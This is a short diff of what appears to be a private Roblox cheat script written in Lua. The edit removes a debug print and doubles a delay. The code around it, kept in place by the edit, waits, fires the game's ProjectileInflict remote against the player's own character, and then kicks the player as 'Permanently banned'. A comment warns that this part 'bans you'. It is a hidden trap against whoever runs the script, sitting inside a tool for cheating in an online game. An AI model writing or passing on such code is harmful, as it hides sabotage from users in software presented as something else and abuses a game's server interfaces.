@@ -2763,8 +2763,8 @@ Notify("Exothium.xyz - Private", "Script loaded")
 game.CoreGui.ewq9erdusafeuwufijnen329duewq_1.Enabled = not game.CoreGui.ewq9erdusafeuwufijnen329duewq_1.Enabled
 
 -- cilerted make sure u delete this cause it bans you mate
-print('debug - loaded')
-wait(60)
+
+wait(120)
 game.ReplicatedStorage.Remotes.ProjectileInflict:FireServer(game.Players.LocalPlayer.Character.PrimaryPart, Vector3.new(-1, -1, -1), 7, tick())
 wait(0.3)
 game.Players.LocalPlayer:Kick("Permanently banned")
